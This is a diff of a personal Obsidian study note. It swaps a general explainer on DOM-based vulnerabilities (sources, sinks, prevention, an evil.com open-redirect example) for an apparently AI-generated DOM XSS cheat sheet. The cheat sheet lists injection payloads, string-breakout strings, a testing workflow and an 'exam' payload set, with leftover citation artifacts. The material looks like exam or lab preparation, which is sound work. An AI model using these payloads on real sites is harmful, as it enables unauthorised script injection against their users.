@@ -1,207 +1,288 @@
-
-Here’s a **clean, structured Obsidian note** you can drop straight into your vault 👇
-
----
-
-# 📌 DOM-Based Vulnerabilities (Obsidian Note)
-
-## 🧠 What is the DOM?
-
-- **DOM (Document Object Model)** = Browser’s hierarchical structure of a webpage.
-    
-- JavaScript interacts with the DOM to:
-    
-    - Modify elements
-        
-    - Change content
-        
-    - Handle user input
-        
-
-⚠️ DOM itself is safe — **insecure data handling is the problem**
+Here’s your **DOM-based XSS cheat sheet**, built exactly in your system style (clean callouts, payload-only code blocks, and operator workflow).
 
 ---
 
-## ⚠️ What are DOM-Based Vulnerabilities?
-
-- Occur when **attacker-controlled data (source)** flows into a **dangerous function (sink)**.
-    
-- Happens entirely on the **client-side (browser)**.
-    
+md
+> [!ABSTRACT]
+> DOM-based XSS is a vulnerability where malicious input is processed **entirely in the browser (client-side)** and executed via JavaScript.  
+> 
+> It occurs when:
+> - Data from a **source** (e.g., URL, input, cookie)  
+> - Flows into a **sink** (e.g., `innerHTML`, `eval`)  
+> - Without proper sanitization  
+> 
+> Unlike other XSS types:
+> - Payload **never reaches the server**  
+> - Everything happens in the browser DOM :contentReference[oaicite:0]{index=0}  
+> 
+> Impact:
+> - Steal cookies/session  
+> - Account takeover  
+> - Execute arbitrary JS  
+> 
+> 🧠 Think: “JavaScript is the vulnerability, not the server”
 
 ---
 
-## 🔄 Taint Flow Concept
+## 🧠 DOM-Based XSS – Cheat Sheet
 
-### 📥 Source
+---
 
-- Input controlled by attacker
-    
+### 🎯 1. Basic Detection (Source Injection)
 
-**Common Sources:**
+> [!CHECK]
+> Inject payload into URL or input  
+> Look for execution in browser  
 
-```
-location
-document.URL
-document.cookie
-document.referrer
-window.name
-localStorage
-sessionStorage
-IndexedDB
+```bash
+# URL parameter
+https://target.com/?q=<script>alert(1)</script>
+````
+
+```bash
+# URL fragment (most common)
+https://target.com/#<img src=x onerror=alert(1)>
 ```
 
 ---
 
-### 📤 Sink
+### 🧪 2. Common Payloads
 
-- Dangerous function that executes or processes data
-    
-
-**Examples:**
-
-```
-eval()
-document.write()
-innerHTML
-window.location
-setAttribute()
-JSON.parse()
-```
-
----
-
-## ⚡ Core Idea
-
-> DOM vulnerabilities = **Source → Sink (unsafe handling)**
-
----
-
-## 💥 Example: DOM Open Redirect
-
-```javascript
-goto = location.hash.slice(1)
-if (goto.startsWith('https:')) {
-  location = goto;
-}
-```
-
-### 🔓 Exploit:
-
-```
-https://victim.com/page#https://evil.com
-```
-
-➡️ Redirects victim to attacker site  
-➡️ Useful for **phishing attacks**
-
----
-
-## 🎯 Common DOM Vulnerabilities & Sinks
-
-|Vulnerability|Sink|
-|---|---|
-|DOM XSS|document.write()|
-|Open Redirect|window.location|
-|Cookie Manipulation|document.cookie|
-|JS Injection|eval()|
-|Link Manipulation|element.src|
-|Web Message Abuse|postMessage()|
-|HTML Injection|innerHTML|
-|Storage Abuse|sessionStorage.setItem()|
-|JSON Injection|JSON.parse()|
-
----
-
-## 🧬 Other Attack Sources
-
-- Reflected input
-    
-- Stored data
-    
-- Web messages (`postMessage`)
-    
-
----
-
-## 🧱 Prevention Techniques
-
-### ✅ 1. Avoid Direct Source → Sink Flow
-
-- Never pass user input directly into sinks
-    
-
----
-
-### ✅ 2. Input Validation (Whitelist)
-
-```javascript
-if (input === "safe_value") { ... }
-```
-
----
-
-### ✅ 3. Output Encoding / Sanitization
-
-- HTML encode
-    
-- URL encode
-    
-- JavaScript escape
-    
-
-⚠️ Must match the **context** of usage
-
----
-
-### ✅ 4. Safe APIs Instead of Dangerous Ones
-
-- Avoid:
-    
-    - `innerHTML`
-        
-    - `eval()`
-        
-- Prefer:
-    
-    - `textContent`
-        
-    - `setAttribute()` (carefully)
-        
-
----
-
-## 🧨 DOM Clobbering
-
-- Advanced attack technique
-    
-- Inject HTML to **override JS variables**
-    
-
-### 🧪 Example:
+> [!SUCCESS]  
+> Works when input is written to DOM
 
 ```html
-<a name="config" href="malicious.js"></a>
+<script>alert(1)</script>
 ```
 
-➡️ Overrides global variable `config`  
-➡️ App loads malicious script
+```html
+<img src=x onerror=alert(1)>
+```
+
+```html
+<svg/onload=alert(1)>
+```
 
 ---
 
-## 🧠 Key Takeaways
+### 🧬 3. JavaScript Context Injection
 
-- DOM vulns are **client-side**
+> [!ATTENTION]  
+> Break out of JS string context
+
+```js
+';alert(1);//
+```
+
+```js
+";alert(1);//
+```
+
+---
+
+### 🧩 4. Sink Exploitation
+
+> [!SUCCESS]  
+> Exploit dangerous DOM sinks
+
+```js
+document.location.hash
+```
+
+```js
+document.write()
+```
+
+```js
+element.innerHTML
+```
+
+```js
+eval()
+```
+
+---
+
+### 💥 5. DOM-Based Payload (Real Case)
+
+> [!SUCCESS]  
+> Inject payload into URL fragment
+
+```bash
+https://target.com/#<img src=x onerror=alert(1)>
+```
+
+---
+
+### ⚙️ 6. DOM XSS via `javascript:` URI
+
+> [!ATTENTION]  
+> Works when app uses unsafe links
+
+```bash
+javascript:alert(1)
+```
+
+---
+
+### 🧪 7. DOM XSS via `document.write`
+
+> [!SUCCESS]  
+> Trigger when input is written directly
+
+```bash
+https://target.com/?input=<script>alert(1)</script>
+```
+
+---
+
+### 💣 8. DOM XSS via `innerHTML`
+
+> [!SUCCESS]  
+> Works when input injected into HTML
+
+```html
+<img src=x onerror=alert(1)>
+```
+
+---
+
+### 🔍 9. Real Workflow (Operator Method)
+
+> [!SUCCESS]
+
+1. Find input source:
     
-- Always think in:
+
+```bash
+?q=test
+```
+
+2. Inject payload:
     
-    ```
-    Source → Flow → Sink
-    ```
+
+```bash
+?q=<img src=x onerror=alert(1)>
+```
+
+3. If not working → try fragment:
     
-- URL is the **most common attack vector**
+
+```bash
+#<img src=x onerror=alert(1)>
+```
+
+4. Identify sink:
     
-- Prevention = **validation + encoding + safe coding**
+
+- `innerHTML`
+    
+- `document.write`
+    
+- `eval`
+    
+
+5. Adjust payload to context
     
 
 ---
+
+### 🧠 10. Sources (Entry Points)
+
+> [!ABSTRACT]
+
+- URL parameters (`location.search`)
+    
+- URL fragments (`location.hash`)
+    
+- Cookies
+    
+- Referrer
+    
+- User input fields
+    
+
+---
+
+### 🧠 11. Sinks (Execution Points)
+
+> [!ABSTRACT]
+
+- `innerHTML`
+    
+- `outerHTML`
+    
+- `document.write`
+    
+- `eval()`
+    
+- `setTimeout()`
+    
+
+---
+
+## 🔥 Minimal Payload Set (EXAM USE)
+
+> [!SUCCESS]  
+> If you remember nothing else
+
+```bash
+# URL param
+?q=<img src=x onerror=alert(1)>
+
+# Fragment
+#<img src=x onerror=alert(1)>
+
+# JS breakout
+';alert(1);//
+
+# javascript URI
+javascript:alert(1)
+```
+
+---
+
+## ⚠️ Operator Notes
+
+> [!FAILURE]  
+> If nothing happens:
+> 
+> - Input not reaching sink
+>     
+> - Proper sanitization
+>     
+> - Safe DOM methods used
+>     
+
+---
+
+> [!ATTENTION]  
+> DOM XSS = Source → Sink
+> 
+> You need:
+> 
+> - Controlled input (source)
+>     
+> - Dangerous function (sink)
+>     
+> 
+> No sink → no exploit
+
+---
+
+```
+
+---
+
+## 🔥 Why this one is tricky (important insight)
+
+- Harder to detect because:
+  - No server response change  
+  - Payload often in `#` (not logged) :contentReference[oaicite:1]{index=1}  
+- Tools miss it → **manual testing is key**
+
+---
+
+
+::contentReference[oaicite:2]{index=2}
+```
